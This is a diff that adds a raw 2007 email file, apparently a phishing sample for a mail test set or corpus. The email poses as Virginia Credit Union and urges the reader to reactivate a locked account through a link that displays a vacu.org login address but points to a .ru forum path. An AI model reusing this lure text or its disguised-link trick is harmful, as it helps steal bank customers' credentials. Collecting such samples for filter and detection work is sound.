@@ -1,0 +1,59 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <secures@vacu.org>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 53E09468D0
+ for <user@login.example.com>; Sun, 20 May 2007 11:36:39 -0400 (EDT)
+Received: from smtp19.orange.fr (smtp19.orange.fr [80.12.242.19])
+ by mail.example.org (Postfix) with ESMTP id 3CB75131FB51
+ for <user@example.com>; Sun, 20 May 2007 11:36:39 -0400 (EDT)
+Received: from me-wanadoo.net (localhost [127.0.0.1])
+ by mwinf1919.orange.fr (SMTP Server) with ESMTP id E95B91C00060;
+ Sun, 20 May 2007 17:36:34 +0200 (CEST)
+Received: from User (LSt-Amand-152-32-50-56.w193-252.abo.wanadoo.fr
+ [193.252.173.56])
+ by mwinf1919.orange.fr (SMTP Server) with SMTP id 6B8301C000B5;
+ Sun, 20 May 2007 17:36:29 +0200 (CEST)
+X-ME-UUID: 20070520153629440.6B8301C000B5@mwinf1919.orange.fr
+From: "Virginia Credit Union" <secures@vacu.org>
+Subject: Reactivate Your Account
+Date: Sun, 20 May 2007 17:36:33 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070520153629.6B8301C000B5@mwinf1919.orange.fr>
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1288
+
+
+<html>
+<head>
+<title>a</title>
+
+</head>
+<body>
+Message:<br>
+<br>
+
+Dear Virginia Credit Union Online Customer,<br>
+<br>
+We regret to inform you, that we had to lock your Virginia Credit Union Online Access<br>
+because we have reasons to believe that your account may have been compromised by outside<br>
+parties. In order to protect your sensitive information, we temporaly suspended  your account.<br>
+<br>
+To reactivate your account, click on the link below and confirm your identity by completing the<br> secure form what will appear.<br>
+<br>
+
+<a href="http://www.advertology.ru/modules/Forums/admin/virginia/index.html">https://secureaccess.vacu.org/online/Banking/cacu/login.aspx</a><br>
+<br>
+We have seen unusual attempts for logging in regarding your personal account, therefore this<br>
+confirmation regarding your account its only for security reasons.<br>
